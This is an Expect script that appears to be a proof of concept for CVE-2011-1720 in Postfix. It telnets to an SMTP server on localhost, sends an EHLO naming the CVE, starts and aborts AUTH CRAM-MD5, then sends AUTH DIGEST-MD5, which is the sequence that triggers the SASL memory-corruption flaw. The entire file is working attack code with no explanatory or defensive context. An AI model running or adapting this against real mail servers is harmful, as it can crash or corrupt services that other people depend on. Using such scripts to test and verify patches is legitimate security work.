#!/usr/bin/expect

set timeout 20
send "postfix reload\n"
sleep 0.5
send "postfix reload\n"
sleep 0.5
send "postfix reload\n"
sleep 0.5
spawn telnet
send "open localhost 25\n"
expect "220 mail.example.fr ESMTP Postfix (Debian/GNU)"
send "ehlo CVE.2011.1720\n"
sleep 0.5
send "AUTH CRAM-MD5\n"
sleep 0.5
send "*\n"
sleep 0.5
send "AUTH DIGEST-MD5"
interact